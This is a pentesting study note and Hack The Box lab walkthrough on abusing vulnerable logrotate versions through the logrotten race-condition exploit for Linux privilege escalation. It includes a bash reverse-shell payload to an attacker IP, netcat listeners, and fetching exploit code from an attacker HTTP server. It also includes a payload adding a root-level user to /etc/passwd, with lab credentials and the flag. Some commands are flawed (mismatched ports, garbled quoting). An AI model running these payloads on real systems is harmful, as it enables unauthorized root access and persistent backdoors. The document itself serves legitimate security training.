---
title: Logrotate
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege
  - escalation
  - linux
  - logrotate
---
# Logrotate

Every Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called `logrotate` takes care of archiving or disposing of old logs. 

`Logrotate` has many features for managing these log files:

- the `size` of the log file,
- its `age`,
- and the `action` to be taken when one of these factors is reached.

The function of the rotation itself consists in renaming the log files. This tool is usually started periodically via `cron` and controlled via the configuration file `/etc/logrotate.conf`. Within this file, it contains global settings that determine the function of `logrotate`.


To force a new rotation on the same day, we can set the date after the individual log files in the status file `/var/lib/logrotate.status`. Example, forcing rotation on samba:

```shell-session
/var/log/samba/log.smbd" 2022-8-3
```

`/etc/logrotate.d/` directory contains the corresponding configuration files for each service.


## logrotten

There is a vulnerability on logrotate that allows a user with write permissions over a log file or any of its parent directories to make logrotatewrite a file in any location. If logrotate is being executed by root, then the user will be able to write any file in /etc/bash_completion.d/ that will be executed by any user that login.

To exploit `logrotate`, we need some requirements that we have to fulfill.

**1.**  we need `write` permissions on the log files

```
ls -la /posible/vulnerable/log.file
```

**2.** logrotate must run as a privileged user or `root`. This is the normal behaviour.

```
which logrotate
ls -la /usr/sbin/logrotate
```

**3.** vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

```
logrotate --version
```


The general idea is that logrotate will archive the log file to the log directory, but there is a split second before this happens, and the exploit will replace the log directory with a symlink to /etc/bash_completion.d/, achieving write as root to /etc/bash_completion.d/.

For exploiting this, we need to locate which service is running the generation of log. One way to explore this is by printing the configuration of every service at `/etc/logrotate.d/`.

```
cat /etc/logrotate.d/

```


The exploit is at: https://github.com/whotwagner/logrotten

```
git clone https://github.com/whotwagner/logrotten.git

cd logrotten

gcc -o logrotten logrotten.c
```

Next, we need a payload to be executed.

 In this example, we will run a simple bash-based reverse shell with the `IP` and `port` of our VM that we use to attack the target system.
 
```shell-session
echo 'sh -i >& /dev/tcp/10.10.15.41/1234 0>&1' > payload
```

However, before running the exploit, we need to determine which option `logrotate` uses in `logrotate.conf`.

```shell-session
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```

If the output is "create", then we will use the exploit adapted to this function.

```
# First set a listener on our kali machine
nc -lnvp 9001


# Now run the exploit adapted to the create function:
./logrotten -p ./payload /tmp/log/pwnme.log
```

If the output is "compress", then we will use the exploit adapted to this function.

```
# First set a listener on our kali machine
nc -lnvp 9001


# Now run the exploit adapted to the compress function:
./logrotten -p ./payload -c -s 4 /tmp/log/pwnme.log
```

Wait for the reverse shell to spawn.

### Trobleshooting:  GLIBC Version 
Troubleshooting when launching the command:

```
./logrotten -p ./payload ~/backups/access.log
```

Output: 

```
./logrotten: /lib/x86_64-linux-gnu/libc.so.6: version GLIBC_2.34' not found (required by ./logrotten)
```


The issue is that the `logrotten` binary compiled requires **GLIBC 2.34**, but the target system has an older version. Here’s how to fix this:

**1.** Check the Target System's GLIBC Version

```
ldd --version
```


Look at the first line. If the version is older than 2.34, we have two options:

**Compile logrotten on the target system (if gcc is available).**

```
which gcc

git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```


**Compile logrotten with an older GLIBC version on the attacking machine.**

Compile logrotten with an Older GLIBC. Find an older system (or a Docker container) that matches the target. Compile logrotten on that system:

```
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten -static
```

The -static flag ensures the binary doesn’t rely on the target system’s GLIBC.


### Trobleshooting:  no  `/etc/logrotate.conf` file

If there is no `/etc/logrotate.conf` file, then logrotate relies on the configuration for each service contained at `/etc/logrotate.d/` directory.

## HTB lab


**SH to  (ACADEMY-LLPE-LOG) with user "htb-student" and password "HTB_@cademy_stdnt!". Escalate the privileges and submit the contents of flag.txt as the answer.**

Connect via ssh to the target. 

We run linpeas_linux_amd64 and notice the lines:

```


```

To exploit `logrotate`, we need some requirements that we have to fulfill.

**1.**  we need `write` permissions on the log files

```
ls -la /home/htb-student/backups
```

**2.** logrotate must run as a privileged user or `root`. This is the normal behaviour.

```
which logrotate
ls -la /usr/sbin/logrotate
```

**3.** vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

```
logrotate --version
```

Output is 3.11.

Craft the payload:

```
echo 'cat /root/flag.txt > /home/htb-student/flag.txt' > payload
```

Run the exploit:

```
# In the kali machine
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
python3 -m http.server 80

# In the target host, download the file and compile it:
wget http://10.10.15.41/logrotten.c
gcc -o logrotten logrotten.c

# Run the exploit
./logrotten -p payload /home/htb-student/backups/access.log

# Open another ssh connection with the target host and trigger the log rotation mechanism for access.log
echo "This is a string" > /home/htb-student/backups/access.log
```

As an outcome (we need to run this even 3 times), we will obtain the flag.txt in our /home/htb-student folder.

```
cat /home/htb-student/flag.txt
```

Results:  HTB{l0G_r0t7t73N_00ps}

Another way to do it:

We will generate a new user with root capabilities:

```
# Generate a hashed password in the target host. My password is going to be "password123"
openssl passwd -1 password123

# Craft the payload. This payload will add the user lele with password password123 with the home directory set to root
# username:hashed_password:UID:GID:comment:home_directory:shell
echo "echo echo "echo 'lele:\$1\$twJx/0OM\$PhLy4vWVoaEWLrd52BDbq/:0:0:lele:/root:/bin/bash' >> /etc/passwd" > payload

# Run the exploit
./logrotten -p payload /home/htb-student/backups/access.log

# Open another ssh connection with the target host and trigger the log rotation mechanism for access.log
echo "This is a string" > /home/htb-student/backups/access.log

# Now we wait for some minutes and after a while, we can cat the /etc/passwd file and see the lele user in there:
cat /etc/passwd

# We can impersonate lele
su lele
# Enter password password123
```


